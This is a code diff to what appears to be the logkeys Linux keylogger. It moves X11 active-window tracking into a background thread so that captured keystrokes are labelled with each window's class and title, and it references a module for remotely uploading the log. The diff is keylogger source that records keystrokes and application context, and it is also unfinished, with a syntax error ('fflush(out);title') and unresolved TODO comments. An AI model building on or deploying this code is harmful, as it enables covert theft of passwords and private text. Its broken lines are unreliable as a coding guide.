@@ -28,6 +28,8 @@
 #include <X11/Xutil.h>
 #include <X11/Xos.h>
 #include <future>
+#include <thread>
+#include <iostream>
 
 #ifdef HAVE_CONFIG_H
 # include <config.h>  // include config produced from ./configure
@@ -72,29 +74,8 @@
 #include "upload.cc"     // functions concerning remote uploading of log file
 
 namespace logkeys {
-/*
-int test () {
-  
 
-
-  
-  NET_WM_NAME = disp.intern_atom('_NET_WM_NAME');
-  NET_ACTIVE_WINDOW = disp.intern_atom('_NET_ACTIVE_WINDOW');
-
-  root.change_attributes(event_mask=Xlib.X.FocusChangeMask)
-  while True:
-      try:
-          window_id = root.get_full_property(NET_ACTIVE_WINDOW, Xlib.X.AnyPropertyType).value[0]
-          window = disp.create_resource_object('window', window_id)
-          window.change_attributes(event_mask=Xlib.X.PropertyChangeMask)
-          window_name = window.get_full_property(NET_WM_NAME, 0).value
-      except Xlib.error.XError:
-          window_name = None
-      print(window_name)
-      event = disp.next_event()
-
-  return 0;
-}*/
+FILE *out;
 
 
 // executes cmd and returns string ouput
@@ -106,8 +87,8 @@ std::string execute(const char* cmd)
   char buffer[128];
   std::string result = "";
   while(!feof(pipe))
-  	if(fgets(buffer, 128, pipe) != NULL)
-  		result += buffer;
+    if(fgets(buffer, 128, pipe) != NULL)
+      result += buffer;
   pclose(pipe);
   return result;
 }
@@ -404,7 +385,7 @@ void determine_input_device()
 
 // write newline then add timestamp and window-title
 ////event is wrong use refercen or pointer
-inline int newline(FILE *& out, struct input_event event, bool program_changed, std::string window_title) {
+inline int newline(FILE *& out, struct input_event event) {
   char timestamp[32];
   int inc_size = fprintf(out, "\n");
 
@@ -412,8 +393,6 @@ inline int newline(FILE *& out, struct input_event event, bool program_changed, 
     strftime(timestamp, sizeof(timestamp), TIME_FORMAT, localtime(&event.time.tv_sec));
     inc_size += fprintf(out, "%s", timestamp);
   }
-  if (program_changed)
-    inc_size += fprintf(out, "%s", window_title.c_str());
 
   return inc_size;
 }
@@ -455,6 +434,71 @@ inline int encode_char(FILE *& out, unsigned int scan_code, bool altgr_in_effect
   
   return inc_size;
 }
+//what about file_size
+void write_window_name()//, struct input_event event, ) 
+{
+  Display *disp = XOpenDisplay(NULL);
+  Window win;
+  XEvent xevent;
+
+  int revert;
+  Atom type;
+  int format;
+  unsigned long nitems, after;
+  unsigned char *class_name = 0;
+  unsigned char *wm_name = 0;
+
+  if (!disp) 
+    fprintf(out, "[ERROR] Could not open display \n\n");
+
+  win = XDefaultRootWindow( disp );
+  //not asynch, can be removed later
+  XSynchronize(disp, true);
+  // set event mask, property changes
+  XSelectInput(disp, win, PropertyChangeMask);
+  int i =0;
+  while (i<200) {
+    i++;
+    //while (XPending(disp)) {
+      XNextEvent(disp, &xevent);
+      if ( xevent.type == PropertyNotify ) {
+        if ( !strcmp( XGetAtomName( disp, xevent.xproperty.atom ), "_NET_ACTIVE_WINDOW" ) ) {
+          //is there a way to get the window deom rhw XEvent?
+          if(XGetInputFocus(disp, &win, &revert)==0)
+            fprintf(out, "noinputfocus \n\n");
+          if (Success == XGetWindowProperty(disp, win, XInternAtom(disp,"WM_CLASS",false), 0, 65536, false, AnyPropertyType, &type, &format, &nitems, &after, &class_name)) {
+            if (class_name) {
+              fprintf(out, "\n[%s] ", class_name);
+              XFree(class_name);
+            }
+            else
+              fprintf(out, "\n[WM_CLASS-NODATA]");
+          }
+          else
+            fprintf(out, "\n[WM_CLASS-NOSUCCESS]");
+  
+          //_NET_WM_NAME, WM_NAME, NET_WM_NAME
+          if (Success == XGetWindowProperty(disp, win, XInternAtom(disp,"WM_NAME",false), 0, 65536, false, AnyPropertyType, &type, &format, &nitems, &after, &wm_name)) {
+            if (wm_name) {
+              fprintf(out, "[%s] > ", wm_name);
+              XFree(wm_name);
+            }
+            else
+              fprintf(out, "[WM_NAME-NODATA] > ");
+          }
+          else
+            fprintf(out, "[WM_NAME-NOSUCCESS] > ");
+        }
+      }
+      else{
+        fprintf(out, "\n\nnot propertynotify \n\n");
+      }
+      fflush(out);
+    }
+  //}
+  XCloseDisplay(disp); 
+}
+
 
 int main(int argc, char **argv)
 {
@@ -527,7 +571,7 @@ int main(int argc, char **argv)
   
   // open log file (if file doesn't exist, create it with safe 0600 permissions)
   umask(0177);
-  FILE *out = fopen(args.logfile.c_str(), "a");
+  out = fopen(args.logfile.c_str(), "a");
   if (!out)
     error(EXIT_FAILURE, errno, "Error opening output file '%s'", args.logfile.c_str());
   
@@ -560,52 +604,15 @@ int main(int argc, char **argv)
   else
     file_size += fprintf(out, "Logging started ...\n\n");
   
-  fflush(out);
+  fflush(out);title
 
-  //// window-title
-  std::string window_id;
-  std::string old_window_id;
-  std::string cur_process_name; 
-  std::string cur_window_name;
-  std::string window_title;
-  bool program_changed = false;
-
-
-
-
-
-
-
-  Display *disp = XOpenDisplay(NULL);
-  Window win;
-  XEvent xevent;
-
-  int revert;
-  Atom type;
-  int format;
-  unsigned long nitems, after;
-  unsigned char *class_name = 0;
-  unsigned char *wm_name = 0;
-
-  if (!disp) 
-    file_size += fprintf(out, "[ERROR] Could not open display \n\n");
-
-  win = XDefaultRootWindow( disp );
-  //not asynch, can be removed later
-  XSynchronize(disp, true);
-  // set event mask, property changes
-  XSelectInput(disp, win, PropertyChangeMask);
-  
-
-/*
-  // async call to write_window_name
-  std::future<void> wndwnm(std::async write_window_name);
-  //is this the end?
-  wndnm.get();*/
-
-  /////////////
-  while (XPending(disp)) {
-    XNextEvent(disp, &xevent);
+  // starting new thread for window-name
+  // inc_size shit is missing
+  // need to timestamp in thread
+  std::thread wn_thread;
+  if (args.flags & FLAG_WINDOW_TITLE) { 
+    wn_thread = std::thread(write_window_name);
+  }
 
   // infinite loop: exit gracefully by receiving SIGHUP, SIGINT or SIGTERM (of which handler closes input_fd)
   while (read(input_fd, &event, sizeof(struct input_event)) > 0) {
@@ -625,48 +632,6 @@ int main(int argc, char **argv)
       if (inc_size > 0) file_size += inc_size;
       continue;
     }
-
-    //// on processid change update window_title write '[process name] "process title" > '
-    //// on process title change (like firefox tabs) would be better. possibly more ressource intensive?
-        
-    
-    
-      //fprintf(out, "xpending: %d i: %d\n\n",XPending(disp), i);
-      if ( xevent.type == PropertyNotify ) {
-        if ( !strcmp( XGetAtomName( disp, xevent.xproperty.atom ), "_NET_ACTIVE_WINDOW" ) ) {
-          //is there a way to get the window deom rhw XEvent?
-          if(XGetInputFocus(disp, &win, &revert)==0)
-            file_size += fprintf(out, "noinputfocus \n\n");
-          if (Success == XGetWindowProperty(disp, win, XInternAtom(disp,"WM_CLASS",false), 0, 65536, false, AnyPropertyType, &type, &format, &nitems, &after, &class_name)) {
-            if (class_name) {
-              file_size += fprintf(out, "\n[%s] ", class_name);
-              XFree(class_name);
-            }
-            else
-              file_size += fprintf(out, "\n[WM_CLASS-NODATA]");
-          }
-          else
-            file_size += fprintf(out, "\n[WM_CLASS-NOSUCCESS]");
-
-          //_NET_WM_NAME, WM_NAME, NET_WM_NAME
-          if (Success == XGetWindowProperty(disp, win, XInternAtom(disp,"WM_NAME",false), 0, 65536, false, AnyPropertyType, &type, &format, &nitems, &after, &wm_name)) {
-            if (wm_name) {
-              file_size += fprintf(out, "[%s] > ", wm_name);
-              XFree(wm_name);
-            }
-            else
-              file_size += fprintf(out, "[WM_NAME-NODATA] > ");
-          }
-          else
-            file_size += fprintf(out, "[WM_NAME-NOSUCCESS] > ");
-        }
-      }
-      else{
-        file_size += fprintf(out, "\n\nnot propertynotify \n\n");
-      }
-      fflush(out);
-    
-
 
 
     // if remote posting is enabled and size treshold is reached
@@ -728,10 +693,10 @@ int main(int argc, char **argv)
     if (event.value == EV_MAKE) {
       // on ENTER key or Ctrl+C/Ctrl+D event append timestamp and window-title
       if (scan_code == KEY_ENTER || scan_code == KEY_KPENTER) {
-        inc_size += newline(out, event, program_changed, window_title);
+        inc_size += newline(out, event);
       }
-      else if (program_changed || (ctrl_in_effect && (scan_code == KEY_C || scan_code == KEY_D))) {
-        inc_size += newline(out, event, program_changed, window_title);
+      else if (ctrl_in_effect && (scan_code == KEY_C || scan_code == KEY_D)) {
+        inc_size += newline(out, event);
         inc_size += encode_char(out, scan_code, altgr_in_effect, shift_in_effect);
       }
       else { // normal char
@@ -755,12 +720,6 @@ int main(int argc, char **argv)
       if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
         ctrl_in_effect = false;
     }
-
-    // update program id
-    if (args.flags & FLAG_WINDOWTITLE) { 
-      old_window_id = window_id;
-      program_changed = false;
-    }
     
     prev_code = scan_code;
     fflush(out);
@@ -768,17 +727,18 @@ int main(int argc, char **argv)
       file_size += inc_size;
     
   } // while (read(input_fd))
-}///////////////
   
+  // stop (////does it??) thread
+  if (args.flags & FLAG_WINDOW_TITLE) { 
+    wn_thread.join();
+  }
+
   // append final timestamp, close files and exit
   time(&cur_time);
   strftime(timestamp, sizeof(timestamp), "%F %T%z", localtime(&cur_time));
   fprintf(out, "\n\nLogging stopped at %s\n\n", timestamp);
   
   fclose(out);
-
-  ////
-  XCloseDisplay(disp); 
   
   remove(PID_FILE);
   
